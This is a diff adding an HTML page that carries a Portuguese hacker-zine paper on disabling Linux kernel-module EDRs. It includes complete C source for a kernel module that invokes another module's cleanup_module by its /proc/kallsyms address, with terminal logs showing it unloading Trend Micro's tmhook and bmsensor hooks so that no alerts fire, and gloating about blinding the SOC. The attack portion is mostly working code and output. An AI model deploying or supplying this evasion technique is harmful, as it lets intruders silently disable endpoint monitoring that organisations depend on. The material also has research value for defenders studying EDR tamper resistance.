@@ -1,0 +1,457 @@
+<!DOCTYPE html>
+<html lang="pt">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=1024">
+    <link rel="icon" type="image/x-icon" href="../../../favicon.ico">
+    <title>Paper: Unhooking EDRs baseados em Linux Kernel Module - Amolo</title>
+
+    <style>
+    @font-face {
+        font-family: 'EnglishTowne';
+        src: url('../../../fonts/EnglishTowne.ttf') format('truetype');
+    }
+
+    body {
+        background-image: url('../../../imgs/bg.png');
+        background-size: cover;
+        background-repeat: no-repeat;
+        background-position: center;
+        background-attachment: fixed;
+        margin: 0;
+        padding: 0;
+    }
+
+    .ascii {
+        color: white;
+        padding: 30px;
+        text-align: center;
+        font-family: 'EnglishTowne', cursive;
+        font-size: 90px;
+    }
+
+    .nav {
+        display: flex;
+        justify-content: center;
+        background-color: rgba(5, 5, 5, 0.8);
+        gap: 10px;
+        padding: 10px 0;
+    }
+
+    .nav a {
+        color: white;
+        text-align: center;
+        padding: 14px 16px;
+        text-decoration: none;
+        font-family: monospace;
+    }
+
+    .nav a:hover {
+        background-color: rgb(38, 7, 112);
+        color: white;
+        border-radius: 5px;
+    }
+
+    .nav a.active {
+        background-color: rgb(71, 37, 153);
+        color: white;
+        border-radius: 5px;
+    }
+
+    .card {
+        color: #000;
+        background-color: #aaa;
+        padding: 20px;
+        margin-top: 20px;
+    }
+
+    .pre-container {
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        min-height: 100vh;
+    }
+
+    pre {
+		background-color: #1e1e1e40;
+		color: white;
+		padding: 20px 30px;
+		border-radius: 10px;
+		box-shadow: 0 4px 8px rgba(0,0,0,0.5);
+		width: 90%;
+		max-width: 1200px;
+		margin: 0 auto;
+		overflow-x: auto;
+		white-space: pre-wrap;
+		font-family: monospace;
+
+		border: 2px solid rgba(255, 255, 255, 0.75);
+		box-sizing: border-box;
+
+		text-indent: 0;
+		word-break: break-word;
+	}
+    </style>
+</head>
+
+<body>
+    <div class="nav">
+        <a href="../../index.html">❮─❲Home❳─❯</a>
+        <a href="../../papers/" class="active">❮─❲✧Papers✧❳─❯</a>
+        <a href="../../members/">❮─❲Membros❳─❯</a>
+    </div>
+
+    <div class="ascii">
+        Amolo ☽
+    </div>
+
+    <h1 style="line-height: normal; margin:unset; padding:unset; font-family:monospace; text-align:center; color:white;">
+        Unhooking EDRs baseados em Linux Kernel Module
+    </h1>
+    <p style="line-height: normal; margin:unset; padding:unset; margin-bottom: 20px; font-family:monospace; text-align:center; color:white;">
+		Autor: @matheuzsec
+	</p>
+
+    <div class="pre-container">
+        <pre>
+⠀⠀⠀⠀⠀⠀⠀⠀⢠⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⢧⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠻⣦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠤⠤⣤⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⣦⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠙⠻⣶⣤⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠛⢿⣶⣤⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢻⣿⣷⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠙⠻⢿⣿⣶⣤⣤⣀⣀⣀⣀⣠⣾⣿⣿⣿⣷⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣈⣹⣿⣿⣿⣿⣿⣿⣿⣿⡿⠿⣿⣿⣿⣷⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⣀⣠⣤⣤⣤⣤⣤⣄⣀⣤⣶⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⣀⠉⢿⣿⣿⣷⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⡠⠶⠛⠋⠉⠉⠙⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣄⡀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣦⣤⣀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⣀⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡍⠛⠿⣿⡛⢿⣿⣿⣿⣿⣿⣿⣿⣿⣍⡳⣦⡀
+⠀⠀⠀⣠⣴⣶⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠋⠁⠀⠙⣿⣿⣇⠙⢿⣦⡀⠘⠇⠀⠙⢿⡏⠉⠻⣿⡝⠻⣿⣿⣿⣷
+⠀⢠⠞⠉⠀⢨⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⠀⠀⠀⠀⠀⢹⣿⣿⣆⠀⠙⢿⣄⠈⠀⠀⠈⠃⠀⠀⠘⠇⠀⠘⣿⠙⣿
+⠠⠁⠀⠀⠀⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⠀⠀⠀⠀⠀⠀⠀⢻⣿⣿⣷⣤⣀⠙⠷⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠇     MatheuZ Security Apresenta 
+⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠻⣿⣿⣦⡀⠀⠀⠈⠛⢶⣤⣀⣀⣀⣀⡀⠀⠀⠀⠀
+⠀⠀⠀⢀⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⢿⣿⣟⡉⠀⡀⠀⠀⠉⠛⠛⠻⢭⡉⠂⠀   Fvcking Linux Kernel Based EDRs⠀
+⠀⠀⢠⡿⠋⢹⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠛⠿⠯⠤⠀⠀⠀⠀⠀⠀⠀⠈⠂⠀⠀     =------------------------=
+⠀⠀⡜⠀⠀⠈⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣦⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠁⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣦⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀   root@malware:~# insmod unhook.ko
+⠀⠀⠀⠀⠀⢠⣿⠿⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⣄              root@malware:~# dmesg
+⠀⠀⠀⠀⠀⢠⣿⠿⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⣄              [ 1337.001337]
+⠀⠀⠀⠀⠀⣾⠁⠀⠈⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢟⢯⣻⢾⢻⣿⣿⣿⣦⡀           [ 1337.001337]  
+⠀⠀⠀⠀⠀⣾⠁⠀⠈⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢟⢯⣻⢾⢻⣿⣿⣿⣦⡀           [ 1337.001337]  Shitting in TrendMicro EDR
+⠀⠀⠀⠀⠀⣾⠁⠀⠈⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢟⢯⣻⢾⢻⣿⣿⣿⣦⡀⠀          [ 1337.001337]         
+⠀⠀⠀⠀⠀⠇⠀⠀⠀⠀⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⡟⢻⣽⣻⣽⣿⣿⣿⣿⣄⠀         [ 1337.001337]
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣏⣽⣿⣿⣿⣿⣿⣿⣿⡄         root@malware:~#⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻⣿⣿⣯⣿⣿⣿⣯⣿⣻⣿⣿⣿⣿⣿⡻⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+
+--[ Sumário ]-----------------------------------------------------------------
+
+1 - Introdução  
+2 - Entendendo como um Módulo de Kernel é removido  
+3 - Removendo hooks de EDR  
+4 - Conclusão
+
+--[ 1 ]--------------------------------------------[ Introdução ]-----
+
+A segurança no Linux sempre foi um assunto de grande interesse para mim,  
+especialmente quando se trata da detecção e mitigação de ameaças no nível  
+do kernel. Estou constantemente buscando entender os mecanismos usados  
+para monitoramento e proteção do sistema, e desta vez, aprofundei minha  
+pesquisa em EDRs (Endpoint Detection and Response) no Linux.
+
+Atualmente, várias soluções de EDR utilizam LKMs (Loadable Kernel Modules)  
+para fazer hook de chamadas de sistema e implementar mecanismos de segurança.  
+Por exemplo, o Trend Micro Deep Security utiliza módulos de kernel para  
+monitoramento e proteção, enquanto o CrowdStrike Falcon se baseia em eBPF  
+(Extended Berkeley Packet Filter) e ML (Machine Learning).
+
+O que mais chamou minha atenção foram os EDRs que utilizam LKMs. Neste zine,  
+vou explorar como podemos manipular esses hooks, removendo hooks de um  
+LKM específico para evitar a geração de alertas e, potencialmente, desativar  
+seus mecanismos de proteção.
+
+--[ 2 ]--------------------------------------------[ Entendendo como um Módulo de Kernel é removido ]-----
+
+Primeiro, precisamos entender como um módulo de kernel é removido. Para isso,  
+vamos observar um trecho simples de código em C que representa um Loadable Kernel Module (LKM):
+
+
+╔═══════════════════════════════════════╗
+#include &lt;linux/module.h&gt;
+#include &lt;linux/kernel.h&gt;
+#include &lt;linux/init.h&gt;
+
+MODULE_LICENSE("GPL");
+MODULE_AUTHOR("matheuz");
+MODULE_DESCRIPTION("Exemplo");
+
+int matheuz_init(void) {
+    printk(KERN_INFO "Olá, @matheuz!\n");
+    return 0;
+}
+
+void matheuz_exit(void) {
+    printk(KERN_INFO "Tchau, @matheuz!\n");
+}
+
+module_init(matheuz_init);
+module_exit(matheuz_exit);
+╚═══════════════════════════════════════╝
+
+Quando o módulo é carregado, o kernel chama matheuz_init(), registrando  
+"Olá, @matheuz!" no log do kernel. Ao ser removido com `rmmod`, o kernel  
+verifica se o módulo está em uso (refcount), chama matheuz_exit(),  
+registra "Tchau, @matheuz!" e remove o LKM, fazendo com que desapareça  
+de /proc/modules e /sys/module/.
+
+Interessantemente, o kernel cria um alias chamado cleanup_module, apontando  
+para matheuz_exit(), o que pode ser verificado através de /proc/kallsyms:
+
+╔════════════════════════════════════════════════════════════════════════╗
+ cowboy@bebop:~$ sudo insmod matheuz.ko
+ cowboy@bebop:~$ dmesg
+ [ 1894.726088] Olá, @matheuz!
+ cowboy@bebop:~$ sudo cat /proc/kallsyms|grep matheuz | grep -e cleanup_mod
+ ffffffffc113b010 d __UNIQUE_ID___addressable_cleanup_module467  [matheuz]
+ ffffffffc1139040 t cleanup_module [matheuz]
+ ffffffffc1139030 t __pfx_cleanup_module [matheuz]
+ cowboy@bebop:~$
+╚════════════════════════════════════════════════════════════════════════╝
+
+Você pode estar se perguntando: por que isso importa? Afinal, apenas usuários root  
+podem remover módulos usando o rmmod, certo? Errado. Algumas soluções de segurança,  
+como o EDR da Trend Micro, implementam proteções que impedem que seu módulo  
+de kernel seja removido mesmo com privilégios de root:
+
+╔════════════════════════════════════════════════════════════════════════╗
+root@edr:~# lsmod|grep tmhook
+tmhook                143360  110 bmsensor
+root@edr:~# lsmod|grep bmsensor
+bmsensor              557056  2
+tmhook                143360  110 bmsensor
+root@edr:~# 
+root@edr:~# rmmod -f bmsensor
+rmmod: ERROR: ../libkmod/libkmod-module.c:799 kmod_module_remove_module() could not remove 'bmsensor': Resource temporarily unavailable
+rmmod: ERROR: could not remove module bmsensor: Resource temporarily unavailable
+root@edr:~# 
+root@edr:~# rmmod -f tmhook
+rmmod: ERROR: ../libkmod/libkmod-module.c:799 kmod_module_remove_module() could not remove 'tmhook': Resource temporarily unavailable
+rmmod: ERROR: could not remove module tmhook: Resource temporarily unavailable
+root@edr:~# 
+root@edr:~# 
+╚════════════════════════════════════════════════════════════════════════╝
+
+Mas e se, ao invés de usar o rmmod, chamássemos diretamente a função  
+cleanup_module do módulo, contornando essas restrições?
+
+--[ 3 ]--------------------------------------------[ Removendo hooks de EDR ]-----
+
+Como o rmmod não é uma opção viável, podemos contornar essa limitação chamando  
+diretamente a função cleanup_module do módulo. Mas como isso é possível?  
+A resposta é simples: criando um LKM que contenha o endereço dessa função  
+e a invoque.
+
+Em outras palavras, se encontrarmos o endereço da cleanup_module em /proc/kallsyms  
+e a chamarmos, podemos desabilitar os hooks do módulo sem realmente removê-lo da memória.
+
+
+╔════════════════════════════════════════════════════════════════════════╗
+#include &lt;linux/init.h&gt;
+#include &lt;linux/module.h&gt;
+#include &lt;linux/kernel.h&gt;
+#include &lt;linux/list.h&gt;
+#include &lt;linux/slab.h&gt;
+
+struct module_entry {
+    struct list_head list;
+    char *name; 
+    void *address;
+};
+
+static LIST_HEAD(module_list);
+
+static void add_entry(char *name, void *address) {
+    struct module_entry *mod;
+    mod = kmalloc(sizeof(struct module_entry), GFP_KERNEL);
+    if (!mod) {
+        printk(KERN_ERR "Deu ruimkjkj.\n");
+        return;
+    }
+    mod->name = name;
+    mod->address = address;
+    list_add_tail(&mod->list, &module_list);
+}
+
+static void magick_lol(void) {
+    struct module_entry *entry;
+    list_for_each_entry(entry, &module_list, list) {
+        if (strcmp(entry->name, "cleanup_module") == 0) {
+
+            ((void (*)(void))entry->address)();
+            break;
+        }
+    }
+}
+
+static int __init lkm_init(void) {
+    add_entry("cleanup_module", (void *)0xffffffffc093b990); //call
+    magick_lol();
+
+    return 0;
+}
+
+static void __exit lkm_exit(void) {
+  printk(KERN_INFO "Qlq coisa kkjkjkjk\n");
+}
+
+MODULE_LICENSE("GPL");
+MODULE_AUTHOR("matheuz");
+MODULE_DESCRIPTION("Sem descrição kkjkjk");
+MODULE_VERSION("1.0");
+
+module_init(lkm_init);
+module_exit(lkm_exit);
+╚════════════════════════════════════════════════════════════════════════╝
+
+Em resumo, este código simples cria uma lista ligada de estruturas onde cada entrada  
+contém o nome e o endereço de uma função — especificamente, a cleanup_module  
+do módulo tmhook.
+
+Em seguida, ele adiciona uma entrada para a cleanup_module com seu respectivo endereço  
+e chama a função magick_lol(), que procura essa entrada na lista.  
+Se encontrada, a função associada é executada.
+
+Uma vez que o LKM é carregado, você pode verificar os logs do kernel com o `dmesg`  
+para confirmar que o módulo foi "removido" com sucesso. Como resultado, todas as  
+proteções serão contornadas, os alertas pararão de ser acionados, e qualquer  
+operação hookada dentro do módulo de kernel deixará de funcionar. Isso acontece porque  
+cleanup_module é apenas um alias para o module_exit — ou seja, o módulo ainda  
+aparece no `lsmod`, mas seus hooks não estão mais ativos.
+
+
+╔════════════════════════════════════════════════════════════════════════╗
+root@edr:~# lsmod|grep tmhook
+tmhook                143360  110 bmsensor
+root@edr:~# 
+root@edr:~# dmesg|grep tmhook
+[   24.211040] tmhook: loading out-of-tree module taints kernel.
+[   24.211046] tmhook: tainting kernel with TAINT_LIVEPATCH
+[   24.211048] tmhook: module verification failed: signature and/or required key missing - tainting kernel
+[   24.318298] tmhook: tmhook_lookup_symbol(do_int80_syscall_32) failed: register_kprobe = -2
+[   24.318438] tmhook: tmhook_lookup_symbol(ia32_sys_call_table) failed: register_kprobe = -2
+[   24.388078] livepatch: enabling patch 'tmhook'
+[   24.397248] livepatch: 'tmhook': starting patching transition
+[   24.445418] tmhook: tmhook 1.2.2049 loaded
+[   41.049805] livepatch: 'tmhook': patching complete
+root@edr:~# 
+root@edr:~# cat /proc/kallsyms|grep tmhook |grep -e cleanup_module
+ffffffffc08cdd50 d __UNIQUE_ID___addressable_cleanup_module319  [tmhook]
+ffffffffc08cb310 t cleanup_module [tmhook]
+ffffffffc08cb300 t __pfx_cleanup_module [tmhook]
+root@edr:~# 
+root@edr:~# cat unhook.c|grep cleanup_mod
+        if (strcmp(entry->name, "cleanup_module") == 0) {
+    add_entry("cleanup_module", (void *)0xffffffffc08cb310); //call
+root@edr:~# 
+╚════════════════════════════════════════════════════════════════════════╝
+
+Observe que o módulo tmhook da Trend Micro está carregado. Agora,
+vamos chamar sua função cleanup_module.
+
+╔════════════════════════════════════════════════════════════════════════╗
+root@edr:~# insmod unhook.ko
+root@edr:~# 
+root@edr:~# dmesg|grep tmhook
+[   24.211040] tmhook: loading out-of-tree module taints kernel.
+[   24.211046] tmhook: tainting kernel with TAINT_LIVEPATCH
+[   24.211048] tmhook: module verification failed: signature and/or required key missing - tainting kernel
+[   24.318298] tmhook: tmhook_lookup_symbol(do_int80_syscall_32) failed: register_kprobe = -2
+[   24.318438] tmhook: tmhook_lookup_symbol(ia32_sys_call_table) failed: register_kprobe = -2
+[   24.388078] livepatch: enabling patch 'tmhook'
+[   24.397248] livepatch: 'tmhook': starting patching transition
+[   24.445418] tmhook: tmhook 1.2.2049 loaded
+[   41.049805] livepatch: 'tmhook': patching complete
+[ 1040.077852] tmhook: tmhook 1.2.2049 unloaded
+root@edr:~# 
+root@edr:~# 
+╚════════════════════════════════════════════════════════════════════════╝
+
+Após carregar nosso LKM que chama cleanup_module, verifique os logs do dmesg,
+o tmhook foi descarregado com sucesso. Isso confirma que a técnica
+funcionou perfeitamente! Podemos aplicar a mesma abordagem ao bmsensor, o módulo sensor da Trend Micro.
+
+
+╔════════════════════════════════════════════════════════════════════════╗
+root@edr:~# cat /proc/kallsyms|grep bmsensor|grep -e cleanup_module
+ffffffffc0947ef0 d __UNIQUE_ID___addressable_cleanup_module502  [bmsensor]
+ffffffffc093b990 t cleanup_module [bmsensor]
+ffffffffc093b980 t __pfx_cleanup_module [bmsensor]
+root@edr:~# 
+root@edr:~# cat unhook.c |grep 990
+    add_entry("cleanup_module", (void *)0xffffffffc093b990); //call
+root@edr:~# 
+root@edr:~# insmod unhook.ko
+root@edr:~# 
+╚════════════════════════════════════════════════════════════════════════╝
+
+Como resultado, nenhum alerta será acionado e nenhum dos hooks do módulo
+da Trend Micro funcionará, pois nós efetivamente os "removemos", sem realmente usar o rmmod.
+
+
+╔════════════════════════════════════════════════════════════════════════╗
+ cowboy@bebop:~$ sudo insmod matheuz.ko
+ cowboy@bebop:~$ dmesg
+ [ 5415.087197] Olá, @matheuz!
+ cowboy@bebop:~$
+ cowboy@bebop:~$ sudo cat /proc/kallsyms|grep matheuz|grep -e cleanup_mod
+ ffffffffc113b010 d __UNIQUE_ID___addressable_cleanup_module467  [matheuz]
+ ffffffffc1139040 t cleanup_module [matheuz]
+ ffffffffc1139030 t __pfx_cleanup_module [matheuz]
+ cowboy@bebop:~$
+ cowboy@bebop:~$ cat unhook.c |grep cleanup_mod
+         if (strcmp(entry->name, "cleanup_module") == 0) {
+     add_entry("cleanup_module", (void *)0xffffffffc1139040); //chamada
+ cowboy@bebop:~$
+ cowboy@bebop:~$ sudo insmod unhook.ko
+ cowboy@bebop:~$
+ cowboy@bebop:~$ dmesg
+ [ 5415.087197] Olá, @matheuz!
+ [ 5493.200914] Tchau, @matheuz!
+ cowboy@bebop:~$
+╚════════════════════════════════════════════════════════════════════════╝
+
+Essa técnica pode ser aplicada a qualquer módulo que implemente cleanup_module,  
+seja ele um EDR, rootkit ou qualquer outro LKM.
+
+--[ 4 ]--------------------------------------------[ Conclusão ]-----
+
+Módulos de kernel apresentam múltiplas superfícies de ataque e, ao manipular  
+a função cleanup_module, conseguimos desabilitar hooks e suprimir alertas  
+sem remover oficialmente o módulo. Isso demonstra que o próprio design do Linux  
+oferece caminhos alternativos para aqueles que sabem onde procurar.
+
+
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢤⣶⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣤⡾⠿⢿⡀⠀⠀⠀⠀⣠⣶⣿⣷⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⣦⣴⣿⡋⠀⠀⠈⢳⡄⠀⢠⣾⣿⠁⠈⣿⡆⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⣰⣿⣿⠿⠛⠉⠉⠁⠀⠀⠀⠹⡄⣿⣿⣿⠀⠀⢹⡇⠀⠀⠀
+⠀⠀⠀⠀⠀⣠⣾⡿⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⣰⣏⢻⣿⣿⡆⠀⠸⣿⠀⠀⠀
+⠀⠀⠀⢀⣴⠟⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣾⣿⣿⣆⠹⣿⣷⠀⢘⣿⠀⠀⠀
+⠀⠀⢀⡾⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⣿⣿⠋⠉⠛⠂⠹⠿⣲⣿⣿⣧⠀⠀
+⠀⢠⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣤⣿⣿⣿⣷⣾⣿⡇⢀⠀⣼⣿⣿⣿⣧⠀ 0x1337 >>> EDR acabou de ser ADORMECIDO
+⠰⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⡘⢿⣿⣿⣿⠀ 
+⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⣷⡈⠿⢿⣿⡆ 0x1337 >>> como o SOC irá funcionar se nenhum alerta será gerado? KKKK
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠛⠁⢙⠛⣿⣿⣿⣿⡟⠀⡿⠀⠀⢀⣿⡇
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣶⣤⣉⣛⠻⠇⢠⣿⣾⣿⡄⢻⡇
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣦⣤⣾⣿⣿⣿⣿⣆⠁
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+Discord: ftrace
+Twitter: @MatheuzSecurity
+Rootkit Researchers: https://discord.gg/66N5ZQppU7
+Rootkits codes 4fun: https://github.com/MatheuZSecurity/Rootkit
+
+PoC Unhooking o Linux TrendMicro EDR no X:
+https://x.com/MatheuzSecurity/status/1894395704816132212
+                </pre>                    
+        </div>
+    </body>
+</html>
